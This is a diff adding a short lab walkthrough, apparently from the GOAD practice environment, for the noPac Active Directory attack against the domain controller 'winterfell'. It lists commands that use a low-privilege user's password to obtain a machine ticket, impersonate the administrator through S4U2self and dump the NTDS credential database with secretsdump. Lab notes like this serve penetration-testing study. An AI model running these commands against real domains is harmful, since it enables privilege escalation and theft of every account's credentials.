@@ -14,4 +14,31 @@ NOPAC       192.168.56.11   445    WINTERFELL       VULNERABLE
 NOPAC       192.168.56.11   445    WINTERFELL       Next step: https://github.com/Ridter/noPac
 
 ```
+---
+get tgt for computer:
 https://github.com/Ridter/noPac
+```bash
+ python3 ~/tools/noPac/noPac.py 'north.sevenkingdoms.local/jon.snow':'iknownothing' -dc-ip 192.168.56.11
+
+```
+
+export it:
+```bash
+export KRB5CCNAME=winterfell.ccache
+```
+
+get administrator ticket (Obtain a service ticket with S4U2self by presenting the previous TGT):
+```bash
+getST.py -self -impersonate 'administrator' -altservice 'CIFS/winterfell.north.sevenkingdoms.local' -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell' -debug
+```
+
+export ticket
+```bash
+export KRB5CCNAME=administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache
+```
+
+
+dump ntds
+```bash
+secretsdump.py -k winterfell.north.sevenkingdoms.local
+```
